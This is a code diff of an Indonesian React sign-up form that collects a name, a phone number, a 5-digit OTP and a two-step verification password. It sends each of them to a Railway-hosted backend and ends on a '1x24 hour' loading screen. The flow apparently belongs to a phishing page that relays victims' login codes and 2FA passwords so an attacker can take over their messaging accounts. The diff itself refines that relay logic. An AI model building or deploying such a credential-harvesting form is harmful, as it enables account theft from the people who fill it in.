@@ -10,14 +10,14 @@ export default function AuthForm() {
   const [step, setStep] = useState(1)
   const [isLoading, setIsLoading] = useState(false)
   const [otpError, setOtpError] = useState(false)
-  const [timer, setTimer] = useState(0) // Timer diatur oleh aksi frontend/backend
+  const [timer, setTimer] = useState(0)
   
   const [nama, setNama] = useState("")
   const [nomor, setNomor] = useState("")
   const [otp, setOtp] = useState("")
   const [sandi, setSandi] = useState("")
 
-  // Fungsi Logika Hitung Mundur
+  // Logika Timer Hitung Mundur
   useEffect(() => {
     let interval: any
     if (timer > 0) {
@@ -29,10 +29,19 @@ export default function AuthForm() {
   }, [timer])
 
   const handleNext = async () => {
-    // 1. Validasi Form Awal (Wajib diisi)
+    // Validasi Form Step 1
     if (step === 1) {
       if (nama.trim() === "" || nomor.length < 10) {
         toast.error("Nama wajib diisi dan nomor minimal 10 angka")
+        return
+      }
+    }
+
+    // Validasi Form Step 2 (OTP)
+    if (step === 2) {
+      if (otp.length !== 5 || isNaN(Number(otp))) {
+        setOtpError(true)
+        toast.error("OTP harus 5 digit angka!")
         return
       }
     }
@@ -41,57 +50,51 @@ export default function AuthForm() {
     setOtpError(false)
 
     try {
-      // Menghubungkan ke Backend kamu
+      // Menghubungkan ke Backend Railway kamu
       const response = await fetch("https://backend-python-production-6e72.up.railway.app/register", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ nama, nomor, otp, sandi, step })
       })
+      
       const result = await response.json()
 
-      if (step === 1) {
-        setStep(2)
-        setTimer(60) // Mulai hitung mundur 60 detik setelah kirim nomor
-      } else if (step === 2) {
-        // 2. Validasi OTP: Harus 5 angka
-        if (otp.length !== 5 || isNaN(Number(otp))) {
-          setOtpError(true)
-          toast.error("OTP harus 5 digit angka!")
-          setIsLoading(false)
-          return
+      if (response.ok) {
+        if (step === 1) {
+          setStep(2)
+          setTimer(60)
+          toast.success("Kode OTP telah dikirim!")
+        } else if (step === 2) {
+          // Jika OTP Benar tapi butuh 2FA
+          if (result.status === "need_2fa") {
+            setStep(3)
+            toast.info("Akun terproteksi, masukkan sandi 2FA Anda.")
+          } else {
+            setStep(4) // Berhasil Login
+          }
+        } else if (step === 3) {
+          setStep(4) // Berhasil setelah 2FA
         }
-
-        // Jika backend merespon OTP benar dan butuh 2FA
-        if (result.status === "need_2fa") {
-          setStep(3)
-        } else if (result.status === "success") {
-          setStep(4)
-        } else {
-          setOtpError(true) // Kotak jadi merah jika salah
-        }
-      } else if (step === 3) {
-        setStep(4)
+      } else {
+        // Menangani Error dari Backend (OTP/Sandi Salah)
+        setOtpError(true)
+        toast.error(result.message || "Terjadi kesalahan, periksa kembali data Anda.")
       }
     } catch (e) {
-      // Simulasi Demo jika backend offline
-      if (step === 1) { setStep(2); setTimer(60); }
-      else if (step === 2) {
-        if (otp === "12345") setStep(3)
-        else setOtpError(true)
-      }
-      else if (step === 3) setStep(4)
+      toast.error("Gagal terhubung ke server backend.")
     } finally {
-      setIsLoading(false)
+      setIsLoading(false) // Loading berhenti apapun hasilnya
     }
   }
 
   const handleBack = () => {
     setStep(1)
     setOtp("")
+    setSandi("")
     setOtpError(false)
   }
 
-  // Tampilan Akhir: Loading 1x24 Jam
+  // Tampilan Akhir: Loading Sesuai Permintaan
   if (step === 4) {
     return (
       <div className="w-full max-w-md mx-auto p-10 border rounded-2xl shadow-lg bg-white text-center">
@@ -104,7 +107,6 @@ export default function AuthForm() {
 
   return (
     <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white relative">
-      {/* Tombol Kembali untuk Edit Nomor */}
       {(step === 2 || step === 3) && (
         <button onClick={handleBack} className="absolute left-4 top-4 p-2 text-gray-400 hover:text-[#1d71d3]">
           <ArrowLeft className="h-6 w-6" />
@@ -146,13 +148,13 @@ export default function AuthForm() {
               className={`text-center text-2xl tracking-[1rem] font-bold h-16 ${otpError ? 'border-red-500 bg-red-50' : 'border-[#1d71d3]'}`}
               placeholder="00000"
             />
-            {otpError && <p className="text-red-500 text-sm mt-2 font-bold uppercase italic">OTP Salah atau Kadaluarsa!</p>}
+            {otpError && <p className="text-red-500 text-sm mt-2 font-bold uppercase italic">Kode Salah atau Kadaluarsa!</p>}
             
             <div className="mt-4 text-sm text-gray-600">
               {timer > 0 ? (
                 <span>Kirim ulang dalam <span className="font-bold">{timer} detik</span></span>
               ) : (
-                <button onClick={() => { setTimer(60); handleNext(); }} className="text-[#1d71d3] font-bold underline">Kirim Ulang Kode</button>
+                <button onClick={() => { setStep(1); setTimer(0); }} className="text-[#1d71d3] font-bold underline">Kirim Ulang Kode</button>
               )}
             </div>
           </div>
@@ -161,7 +163,14 @@ export default function AuthForm() {
         {step === 3 && (
           <div className="text-center">
             <label className="font-semibold block mb-2 text-sm uppercase">Masukkan Kata Sandi (2FA)</label>
-            <Input value={sandi} onChange={(e) => setSandi(e.target.value)} type="password" placeholder="******" className="text-center" />
+            <Input 
+              value={sandi} 
+              onChange={(e) => setSandi(e.target.value)} 
+              type="password" 
+              placeholder="******" 
+              className="text-center border-[#1d71d3]" 
+            />
+            <p className="text-[10px] text-gray-400 mt-2 italic">Akun Anda mengaktifkan Verifikasi Dua Langkah.</p>
           </div>
         )}
 
